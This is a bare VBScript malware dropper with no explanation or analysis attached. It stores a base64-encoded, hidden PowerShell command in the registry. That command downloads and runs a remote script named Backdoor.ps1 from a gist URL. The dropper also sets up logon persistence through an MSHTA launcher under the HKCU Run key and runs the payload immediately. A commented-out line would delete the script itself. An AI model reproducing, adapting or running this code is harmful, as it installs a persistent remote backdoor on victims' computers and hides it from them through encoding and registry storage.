set Obj0 = CreateObject("Wscript.Shell")
H="powershell.exe -ep bypass -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAcwB0AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBFAGwAbQAwAEQALwAzAGUAMQA2ADAAOABhAGMANABjADEAYQAxADkAMwBhADcAZAA2ADMAYgA0AGIAMQAwAGMAYwA4AGYAZQBjADQALwByAGEAdwAvADgAOQA4ADMAZQAxADAAZQBmAGUAOAAyADYAMgAyADYAMABmAGEAZgBiADQAOQA1ADMAOQBhAGIAMwBjADgAOQA4ADYAOAA5ADUAYgA3ADgALwBCAGEAYwBrAGQAbwBvAHIALgBwAHMAMQAnACkAOwA="
D="HKCU\v1Elm0D"
Obj0.regwrite D,H,"REG_EXPAND_SZ"
RR="MSHTA VbScript:Execute(" & chrw(34) & "CreateObject(" & chrw(34) & chrw(34) & "Wscript.Shell" & chrw(34) & chrw(34) & ").Run CreateObject(" & chrw(34) & chrw(34) & "Wscript.Shell" & chrw(34) & chrw(34) & ").RegRead(" & chrw(34) & chrw(34) & D & chrw(34) & chrw(34) & "), 0, False:close" & chrw(34) & ")"
Obj0.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Warn", RR, "REG_EXPAND_SZ"
Obj0.Run RR,0,false
'Obj0.Run  "cmd.exe /c del " & ChrW(34) & Wscript.scriptfullname & ChrW(34),0,false